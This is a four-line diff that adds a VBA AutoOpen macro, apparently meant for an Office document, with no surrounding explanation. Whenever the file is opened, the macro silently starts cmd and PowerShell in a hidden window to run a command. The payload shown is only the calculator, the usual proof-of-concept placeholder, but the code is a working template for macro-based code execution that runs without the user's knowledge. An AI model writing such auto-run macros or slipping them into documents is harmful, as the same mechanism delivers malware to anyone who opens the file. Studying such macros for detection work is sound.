@@ -1,0 +1,4 @@
+Sub AutoOpen()
+CreateObject("WScript.Shell").Run "cmd /c powershell -nop -c calc", 0
+End Sub
+
